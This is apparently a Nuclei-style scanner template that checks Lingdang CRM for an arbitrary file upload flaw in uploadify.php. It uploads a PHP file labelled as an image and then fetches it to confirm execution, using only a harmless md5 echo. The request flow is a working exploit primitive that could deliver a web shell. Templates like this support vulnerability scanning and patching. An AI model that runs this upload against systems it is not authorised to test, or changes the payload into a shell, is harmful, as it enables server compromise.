id: poc-yaml-51mis-crm-uploadify-anyfile-upload
info:
  name: 灵当crm uploadify 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
  description: |
    Arbitrary file upload vulnerability in Lingdang CRM's uploadify feature.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/crm/uploaddify/uploadify.php"
    headers:
      Content-Type: "multipart/form-data; boundary=---------------------------45250802924973458471174811279"
    body: |-
      -----------------------------45250802924973458471174811279
      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.php"
      Content-Type: images/cat_icon

      <?php echo md5({{t1}});?>
      -----------------------------45250802924973458471174811279
      Content-Disposition: form-data; name="myatt_moduel"

      1
      -----------------------------45250802924973458471174811279
      Content-Disposition: form-data; name="myatt_id";

      1
      -----------------------------45250802924973458471174811279
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ".php"
      - type: word
        part: body
        words:
          - "<"
        negative: true

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/crm/storage/1/1/{{t1}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
